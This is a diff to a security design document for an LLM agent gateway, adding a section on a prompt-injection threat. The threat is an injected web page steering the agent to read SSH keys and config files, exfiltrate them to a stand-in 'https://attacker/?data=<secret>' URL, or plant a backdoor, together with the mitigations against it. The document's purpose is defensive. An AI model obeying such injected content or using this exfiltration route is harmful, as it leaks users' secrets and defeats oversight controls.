@@ -2,8 +2,9 @@
 
 Written 2026-09-08. Updated 2026-09-15 for issue #58: replaced the unsound
 allowlist with a per-session approval gate. Status: **implemented** —
-`src/security.ts`, `/bash` in `src/index.ts`, hardening in
-`pi-gateway.service`; self-check: `npx tsx src/security-check.ts`.
+`src/security.ts`, `/bash` in `src/index.ts`, hardening in `pi-gateway.service`,
+ungated file-tool exclusion + fetch guard (issue #82); self-check:
+`npx tsx tests/security-check.ts`.
 
 ## Threat model
 
@@ -92,19 +93,48 @@ RestrictSudo=yes
 - Ceiling: container/VM/VPS (pi's docs point at a Gondolin micro-VM
   integration) is still stronger — see `Dockerfile`.
 
+## Ungated built-in file tools (issue #82)
+
+The bash gate only covers bash. pi ships built-in `read`/`edit`/`write` tools that
+resolve absolute paths and `~` with no sandbox and write anywhere the OS user can
+(`ReadWritePaths=%h/GAIA` makes the cwd writable). A prompt-injected page could use
+them to read `~/.pi-gateway/config.json` / `~/.ssh/id_rsa` (and exfiltrate via
+`fetchpage` to a public server) or to rewrite `src/index.ts`/`config.json` for a
+persistent backdoor — all without ever touching bash, so neither the gate nor
+memory staging engages.
+
+Mitigations (all wired in `src/session.ts` / `src/web.ts`):
+
+- **File tools excluded from sessions.** `createAgentSession` gets
+  `excludeTools: ["read", "edit", "write"]`, so every file access flows through
+  the gated `bash` tool (our custom `bash` shadows the built-in by name).
+  `runOneShot` does the same unless an explicit `tools` allowlist is passed
+  (e.g. `/plan` deliberately allows `read` for a trusted one-shot turn).
+- **No file-mutation tool survives**, so there is no write channel to tamper with
+  `index.ts`/`config.json`; the `allowedChatIds` allow-list and the bash gate
+  can't be edited away by the model.
+- **`fetchpage` refuses query-bearing URLs.** The remaining exfiltration channel
+  would be `fetchpage` to `https://attacker/?data=<secret>`; `safeFetch` only
+  blocks private hosts, so a public server is fine. fetchpage now refuses any URL
+  with a query string (websearch posts its query in the body and is unaffected),
+  and with `read` excluded the model has no secret source to leak anyway.
+
+Ceiling: still a container/VM/VPS (pi's docs point at a Gondolin micro-VM).
+
 ## Explicitly skipped
 
 - **Deny-lists** — the gate subsumes them.
 - **DM pairing** — `allowedChatIds` already is that.
-- **Per-tool policies beyond bash** — read/write are bounded by ProtectHome;
-  bash is the escalation vector.
+- **Per-tool policies beyond bash** — superseded by issue #82: read/edit/write are
+  excluded outright, which is stricter than any per-file policy; bash remains the
+  escalation vector and keeps the gate.
 - **Allowlists of any kind** — unsound (see issue #58).
-- **Live y/N approval** — deadlocks against the serialized turn loop.
+- **Live y/N approval** — deadlocks against the serialized turn loop (see #2).
 
 ## Verification
 
 - `npx tsc --noEmit`
-- `npx tsx src/security-check.ts` — gate starts closed, refuses a benign
+- `npx tsx tests/security-check.ts` — gate starts closed, refuses a benign
   command, runs it after `/bash`, and closes again on a new session.
 - After service edit: `systemctl --user daemon-reload && systemctl --user
   restart pi-gateway` and confirm the agent asks for `/bash` before running
